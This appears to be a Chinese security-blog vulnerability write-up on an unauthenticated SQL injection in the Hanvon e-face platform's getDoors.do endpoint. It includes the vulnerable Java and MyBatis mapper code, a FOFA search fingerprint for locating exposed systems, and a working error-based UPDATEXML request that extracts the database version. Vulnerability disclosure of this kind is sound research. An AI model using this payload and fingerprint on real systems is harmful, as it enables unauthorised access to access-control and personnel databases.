---
title: "汉王e脸通综合管理平台 getDoors.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-getDoors-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-getdoors.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 getDoors.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/15 12:25
* 777浏览
* [0评论](#comment)
* 28分钟阅读

深入探索

身份验证

安全

认证


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `getDoors.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

深入探索

漏洞预警服务

VPN服务

文件大小转换

直接看 `FirstPeopleOpenController` 里关于 `getDoors` 的实现

```
@RequestMapping(
        value = {"getDoors.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson getDoors(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String name, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();
        PermissionParams record = new PermissionParams();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            if (null != name) {
                record.setName(name);
            }

            record.setOrder(order);
            record.setColumnKey(columnKey);
            PageHelper.startPage(page, pageSize);
            List<FirstOpenVO> infoList = this.firstPeopleOpenAsm.getDoors(record);
            PageInfo<FirstOpenVO> info = new PageInfo(infoList);
```

深入探索

防火墙软件

企业安全咨询

Web安全书籍

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 AccessFirstOpenDoorDao.xml

代码安全审计

```
<select id="getDoors" resultMap="BaseResultMap2">
    select afod.ID,afod.DOOR_ID,afod.PASS_TIME_ID,dbi.sz_name CONTROLLER_NAME,ddi.NAME DOOR_NAME,afod.START_TIME,afod.END_TIME,afod.CYCLE_WEEK,
    (select
    COUNT(afoe.EMPLOYEE_ID)
    from ACCESS_FIRST_OPEN_EMPLOYEE afoe
    LEFT JOIN SYS_USER SU on afoe.EMPLOYEE_ID = SU.ng_id
    where afoe.DOOR_ID = afod.DOOR_ID and SU.nt_user_state = 1
    ) EMPLOYEE_SUM
    from ACCESS_FIRST_OPEN_DOOR afod
    left join ACCESS_DOOR_INFO ddi on ddi.ID = afod.DOOR_ID
    left join dev_device dbi on dbi.ng_id = ddi.DEVICE_CONTROL_ID
    where afod.STATE != 1
    AND dbi.nt_state = 1
    <if test="name != null and name != ''">
      and ddi.NAME like concat('%', #{name},'%')
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      afod.ID DESC
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/firstPeopleOpen/getDoors.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 getDoors.do SQL注入漏洞](images/img-001-bea07168db1c.webp)](https://image.mrxn.net/b9d38994a17f4c4c84cd68487079d0ae.webp)

成功利用报错注入获取到数据版本号

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 getDoors.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-getDoors-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-getDoors-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-getDoors-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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